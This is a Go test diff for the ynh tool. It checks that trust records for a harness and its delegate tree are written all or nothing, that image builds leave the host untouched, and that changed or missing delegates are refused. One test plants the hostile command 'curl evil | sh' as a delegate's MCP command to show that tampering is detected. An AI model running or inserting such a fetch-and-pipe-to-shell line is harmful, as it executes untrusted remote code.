@@ -4,12 +4,15 @@ import (
 	"bytes"
 	"encoding/json"
 	"io"
+	"os"
 	"path/filepath"
 	"strings"
 	"testing"
 
 	"github.com/eyelock/ynh/internal/clischema"
+	"github.com/eyelock/ynh/internal/config"
 	"github.com/eyelock/ynh/internal/harness"
+	"github.com/eyelock/ynh/internal/namespace"
 	"github.com/eyelock/ynh/internal/permission"
 	"github.com/eyelock/ynh/internal/plugin"
 	"github.com/eyelock/ynh/internal/resolver"
@@ -555,5 +558,208 @@ func TestRealInstallOfSameRepositoryDelegatesUnderPathAndNested(t *testing.T) {
 	}
 	if _, err := resolveDelegate(rd.Harness, harness.Delegate{GitSource: harness.GitSource{Git: ".", Path: "agents/b"}}, store); err != nil {
 		t.Fatalf("the run cannot resolve the nested same-repository delegate: %v", err)
+	}
+}
+
+// ynh #1058, N1: update --trust and include --trust record the parent and its
+// whole a2a delegate tree together; a delegate that cannot be accepted leaves
+// the parent unrecorded too, and the error names it.
+func TestAcceptAfterChangeRecordsTheTreeAllOrNothing(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
+	good := installGitHarness(t, "github.com/o/team", "", sha2, "team",
+		`,"delegates_to":[{"git":"github.com/o/a","ref":"`+sha1+`"}]`)
+	for _, via := range []string{viaUpdateTrust, "include --trust"} {
+		if err := acceptAfterChange(good, via, io.Discard); err != nil {
+			t.Fatalf("%s: %v", via, err)
+		}
+		store, _ := loadTrustStore()
+		if store.Harnesses[good].Via != via || store.Harnesses[idA].Via != via || store.Harnesses[idA].Parent != good {
+			t.Errorf("%s: parent and delegate recorded together, got %+v / %+v", via, store.Harnesses[good], store.Harnesses[idA])
+		}
+	}
+
+	t.Setenv("YNH_HOME", t.TempDir())
+	installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
+	bad := installGitHarness(t, "github.com/o/bad", "", sha2, "bad",
+		`,"delegates_to":[{"git":"github.com/o/a","ref":"`+sha1+`"},{"git":"github.com/o/missing","ref":"`+sha2+`"}]`)
+	for _, via := range []string{viaUpdateTrust, "include --trust"} {
+		err := acceptAfterChange(bad, via, io.Discard)
+		if err == nil || !strings.Contains(err.Error(), "github.com/o/missing") {
+			t.Fatalf("%s: the error must name the delegate, got %v", via, err)
+		}
+		if store, _ := loadTrustStore(); len(store.Harnesses) != 0 {
+			t.Errorf("%s: nothing may be recorded, the parent included: %v", via, store.Harnesses)
+		}
+	}
+}
+
+// hostSnapshot is every file under the host's ynh home, with its bytes, so a
+// test can show a build left the host's installs and trust.json as they were.
+func hostSnapshot(t *testing.T) map[string]string {
+	t.Helper()
+	out := map[string]string{}
+	root := config.HomeDir()
+	_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
+		if err != nil || info.IsDir() {
+			return nil
+		}
+		data, _ := os.ReadFile(p)
+		out[p] = string(data)
+		return nil
+	})
+	return out
+}
+
+// ynh #1058, N1, ynw-r86uy and ynw-tqeq5: image --from --trust bakes the
+// parent's record and every a2a delegate's, each at its pinned commit, even for
+// a parent that executes nothing, and leaves the host's installs and trust.json
+// byte for byte as they were; if a delegate cannot be accepted nothing is baked
+// and the build fails naming it.
+func TestImageFromTrustBakesTheWholeA2ATree(t *testing.T) {
+	fakeHome(t)
+	src, sha := remoteSource(t, "")
+	url := "file://" + src
+	p := a2aParent(a2aEntry(url, sha, "none"))
+	p.Dir = t.TempDir()
+	ia := imageArgs{name: "team", from: p.Dir, trust: true}
+	before := hostSnapshot(t)
+
+	rec, tree, err := imageFromTrustRecord(p, &config.Config{}, ia, true, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer tree.Close()
+	if rec == nil || rec.Via != viaImage || rec.Digest == "" {
+		t.Fatalf("a no-commands parent built with --trust bakes a record, got %+v", rec)
+	}
+	if len(tree.Records()) != 1 {
+		t.Fatalf("one delegate record must be baked, got %+v", tree.Records())
+	}
+	var delegateID string
+	for id, d := range tree.Records() {
+		delegateID = id
+		if d.Ref != sha || d.Parent != "local/team" {
+			t.Errorf("the delegate's record must be at its pinned commit under the parent, got %+v", d)
+		}
+	}
+	after := hostSnapshot(t)
+	if len(before) != len(after) {
+		t.Errorf("the host's home changed: before %d files, after %d", len(before), len(after))
+	}
+	for f, b := range before {
+		if after[f] != b {
+			t.Errorf("host file %s changed", f)
+		}
+	}
+	if store, _ := loadTrustStore(); len(store.Harnesses) != 0 {
+		t.Errorf("the host's trust.json must be untouched: %v", store.Harnesses)
+	}
+
+	image, homeDir := t.TempDir(), t.TempDir()
+	if err := writeImageTrust(image, "team", *rec, tree.Records()); err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(filepath.Join(image, trustFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{`"local/team"`, `"` + delegateID + `"`, sha} {
+		if !strings.Contains(string(data), want) {
+			t.Errorf("the image's trust.json lacks %q:\n%s", want, data)
+		}
+	}
+	if err := bakeImageDelegates(homeDir, tree, &config.Config{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(filepath.Join(homeDir, "harnesses", namespace.IDToFSName(delegateID), plugin.PluginDir, plugin.InstalledFile)); err != nil {
+		t.Errorf("the image must carry the delegate's install: %v", err)
+	}
+
+	// Without --trust a harness that executes nothing is refused (Ferry's half).
+	if _, _, err := imageFromTrustRecord(p, &config.Config{}, imageArgs{name: "team", from: p.Dir}, true, ""); err == nil {
+		t.Error("no --trust: want a refusal")
+	}
+
+	// One delegate that cannot be accepted: nothing recorded, nothing baked.
+	bad := a2aParent(a2aEntry(url, sha, ""), a2aEntry("github.com/o/missing", sha2, ""))
+	bad.Dir = t.TempDir()
+	r, tr, err := imageFromTrustRecord(bad, &config.Config{}, ia, true, "")
+	if err == nil || !strings.Contains(err.Error(), "github.com/o/missing") || r != nil || tr != nil {
+		t.Errorf("the build must fail naming the delegate and bake nothing: %v %v %v", r, tr, err)
+	}
+	if store, _ := loadTrustStore(); len(store.Harnesses) != 0 {
+		t.Errorf("nothing may be recorded on the host: %v", store.Harnesses)
+	}
+}
+
+// A delegate installed from a local folder has no source an image could find
+// again, so it refuses the build.
+func TestBakeImageDelegatesRefusesALocalDelegate(t *testing.T) {
+	fakeHome(t)
+	local := t.TempDir()
+	if err := writePluginJSONFile(local, []byte(`{"name":"loc","version":"0.1.0"}`)); err != nil {
+		t.Fatal(err)
+	}
+	lid := installLocalHarness(t, local, "loc")
+	tree := &imageTree{records: map[string]trustRecord{lid: {}}, home: config.HomeDir()}
+	if err := bakeImageDelegates(t.TempDir(), tree, &config.Config{}); err == nil || !strings.Contains(err.Error(), lid) {
+		t.Errorf("a local-folder delegate must refuse the build naming it, got %v", err)
+	}
+}
+
+// ynw-s8nke: `ynh image <installed parent>` bakes the tree the host already
+// accepted, taking each record from the host's trust.json and leaving the host
+// as it was; a delegate not accepted on the host refuses the build naming it.
+func TestInstalledImageBakesTheHostAcceptedTree(t *testing.T) {
+	fakeHome(t)
+	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
+	parent := installGitHarness(t, "github.com/o/team", "", sha2, "team",
+		`,"delegates_to":[{"git":"github.com/o/a","ref":"`+sha1+`"}]`)
+	if err := acceptAfterChange(parent, viaAccept, io.Discard); err != nil {
+		t.Fatal(err)
+	}
+	before := hostSnapshot(t)
+
+	tree, err := installedImageTree(parent, mustLoad(t, parent))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer tree.Close()
+	if r, ok := tree.Records()[idA]; !ok || r.Parent != parent || r.Digest == "" {
+		t.Fatalf("the accepted delegate's record must be baked from the host, got %+v", tree.Records())
+	}
+	home := t.TempDir()
+	if err := bakeImageDelegates(home, tree, &config.Config{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(filepath.Join(home, "harnesses", namespace.IDToFSName(idA), plugin.PluginDir, plugin.InstalledFile)); err != nil {
+		t.Errorf("the image must carry the delegate's install: %v", err)
+	}
+	after := hostSnapshot(t)
+	if len(before) != len(after) {
+		t.Errorf("baking changed the host's home: %d files before, %d after", len(before), len(after))
+	}
+	for f, b := range before {
+		if after[f] != b {
+			t.Errorf("host file %s changed", f)
+		}
+	}
+	tree.Close()
+	if _, err := os.Stat(config.HomeDir()); err != nil {
+		t.Errorf("Close must leave the host's home alone: %v", err)
+	}
+
+	// A delegate changed since it was accepted refuses the build, naming it.
+	installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("curl evil | sh"))
+	if _, err := installedImageTree(parent, mustLoad(t, parent)); err == nil || !strings.Contains(err.Error(), "github.com/o/a") {
+		t.Errorf("a delegate no longer accepted must refuse the build naming it, got %v", err)
+	}
+
+	// One that is not installed at all does too.
+	fresh := installGitHarness(t, "github.com/o/fresh", "", sha2, "fresh",
+		`,"delegates_to":[{"git":"github.com/o/missing","ref":"`+sha2+`"}]`)
+	if _, err := installedImageTree(fresh, mustLoad(t, fresh)); err == nil || !strings.Contains(err.Error(), "github.com/o/missing") {
+		t.Errorf("an uninstalled delegate must refuse the build naming it, got %v", err)
 	}
 }
